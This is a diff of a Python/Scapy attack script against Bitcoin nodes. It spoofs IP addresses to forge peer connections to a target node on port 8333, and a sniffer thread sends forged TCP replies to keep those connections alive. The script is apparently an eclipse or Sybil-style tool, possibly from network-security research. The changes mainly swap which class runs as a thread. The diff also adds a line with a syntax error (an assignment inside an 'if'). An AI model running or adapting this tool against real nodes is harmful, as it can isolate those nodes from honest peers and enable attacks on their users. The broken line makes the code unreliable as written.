@@ -6,8 +6,7 @@ from bitcoin.messages import msg_version, msg_verack, msg_addr
 
 from scapy.all import ETH_P_ALL, IP, MTU, send, select, sniff, TCP, UDP, Raw, conf, L3RawSocket, sr1, sendp
 
-
-class Sniff_And_Respond:
+class Sniff_And_Respond(threading.Thread):
     def __init__(s, iface, target_ip, dport, sport, ips, connections):
         s.iface = iface
         s.target_ip = target_ip
@@ -15,8 +14,10 @@ class Sniff_And_Respond:
         s.sport = sport
         s.ips = ips
         s.connections = connections
-
         s.peers_forged = 0
+
+        super(Sniff_And_Respond, s).__init__()
+
 
     # Bitcoin utility functions
     def btc_add_magic(s, pkt):
@@ -127,7 +128,7 @@ class Sniff_And_Respond:
                                 p= IP(dst=s.target_ip,src=pkt[IP].dst)/TCP(dport=PORT,sport=RESP_PORT, flags='AR',ack=(pkt.seq+len(payload)),seq=pkt.ack)
                                 send(p, verbose=False)
 
-    def start(s):         
+    def run(s):         
         sniff(iface="lo", 
             prn=s.respond, 
             filter="tcp and host "+s.target_ip+" and port 8333", 
@@ -135,7 +136,7 @@ class Sniff_And_Respond:
 
 
 
-class ConnectionInitiator(threading.Thread):
+class ConnectionInitiator:
      def __init__(s, iface, target_ip, dport, sport, ips, connections):
         s.iface = iface
         s.target_ip = target_ip
@@ -144,11 +145,7 @@ class ConnectionInitiator(threading.Thread):
         s.ips = ips
         s.connections = connections
 
-        super(ConnectionInitiator, s).__init__()
-
-     def run(s):
-        IPs = s.ips
-
+     def start(s):
         ip_index = 0
         new_index = 0
         tried_index = 0
@@ -156,8 +153,8 @@ class ConnectionInitiator(threading.Thread):
         tried = []
         new = []
 
-        for ip in IPs:
-            if len(IPs[ip]) == 0:
+        for ip in s.ips:
+            if len(s.ips[ip]) == 0:
                 tried.append(ip)
             else:
                 new.append(ip)
@@ -168,10 +165,9 @@ class ConnectionInitiator(threading.Thread):
 
         print ratio, len(tried), len(new)
 
-
         while True:
 
-            spoofed_ip = IPs.keys()[ip_index % len(IPs) ]
+            spoofed_ip = s.ips.keys()[ip_index % len(s.ips) ]
 
             if  len(tried) == 0 or ip_index % ratio == 0 :
                 spoofed_ip = new[new_index % len(new) ]
@@ -208,13 +204,13 @@ conf.L3socket = L3RawSocket
 
 # TODO: parameterize
 iface = "eth0" #parameter
-target_ip = "" #parameter
-localhost = True  #parameter
-if localhost:
+target_ip = "127.0.0.1" #parameter
+localhost = False  #parameter
+if target_ip = "127.0.0.1":
+    localhost = True
     # Normally linux does not accept non-local ip addresses for TCP connections
     #  over the loopback but if you set sudo sysctl -w net.ipv4.conf.eth0.route_localnet=1
     #  it will work.
-    target_ip  = "127.0.0.1"
 
 dport = 8333 #parameter
 sport = 28333 
@@ -235,11 +231,11 @@ class LockableDict(dict):
         self.lock = threading.Lock()
 connections = LockableDict()
 
-#TODO: this should not be a thread
-conn_thread = ConnectionInitiator(iface, target_ip, dport, sport, ips, connections)
-conn_thread.daemon = True
-conn_thread.start()
-
-#TODO: this should be a thread
+# Start a thread create spoofed TCP connections for the forged peers
 on_path_tap = Sniff_And_Respond(iface, target_ip, dport, sport, ips, connections)
+on_path_tap.daemon = True
 on_path_tap.start()
+
+# Initiate forged peer connections to the bitcoin node
+conn_thread = ConnectionInitiator(iface, target_ip, dport, sport, ips, connections)
+conn_thread.start()
